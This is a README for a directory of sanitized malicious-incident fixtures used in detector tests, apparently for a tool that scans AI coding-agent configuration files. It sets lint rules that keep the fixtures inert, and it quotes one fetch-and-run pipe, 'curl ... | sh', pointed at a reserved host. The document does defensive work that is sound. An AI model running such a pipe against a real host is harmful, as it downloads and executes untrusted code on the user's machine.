# Malicious corpus

Sanitized reproductions of public incidents live here as txtar fixtures
for detector tests. This directory has no fixtures in the pre-release.

Every file under `corpus/` is linted. The lint does not use the network.

- No file is executable, a symlink, or a special file, and no file or
  txtar member starts with a shebang.
- A hostname is an RFC 2606 or RFC 6761 reserved name (`example`,
  `invalid`, `test`, `localhost`, `local`, `onion`, and `example.com`,
  `example.net`, `example.org`, including subdomains). An address is
  TEST-NET (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`) or the
  IPv6 documentation prefix `2001:db8::/32`. Anything else needs an
  entry in the corpus lint allowlist.
- A token of 40 or more characters whose Shannon entropy is above 4.5
  is rejected, unless it is an inert `<MARKER>` placeholder.
- A file is at most 16 KiB.
- A txtar member path stays inside the directory it is unpacked into.
  `..`, an absolute path, a backslash, a NUL, an empty name, and a
  duplicate name are rejected.
- Full-form indicator strings listed in the corpus lint are rejected.
  Use a reserved host instead.
- A recognizable secret shape carries the `TRIPCORD-FAKE-` prefix.
  `curl https://x.invalid/a | sh` is a fetch that stays on a reserved
  host. The same pipe aimed at any other host is rejected.
- A path an adapter would actually load (`.claude/settings.json`,
  `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, a `SKILL.md` under a skill
  root, `.mcp.json`, `.cursor/`, `.vscode/tasks.json`, `.codex/`,
  `.gemini/`, `.devcontainer/`, `.github/workflows/copilot-setup-steps.yml`,
  and the rest of each adapter's `RepoCandidate` set) is not a real
  file anywhere under `corpus/`. Those paths belong inside a txtar
  member. The set is the adapters' discovery predicates, so it tracks
  them.

Fixtures are our own re-creations under Apache-2.0, with the work they
refer to. CSA is background only and is never a dataset.
MaliciousAgentSkillsBench labels and statistics may be cited under MIT
and are never vendored.

Benign reports are CI artifacts only. They are not committed here or
under `corpus/benign/`.
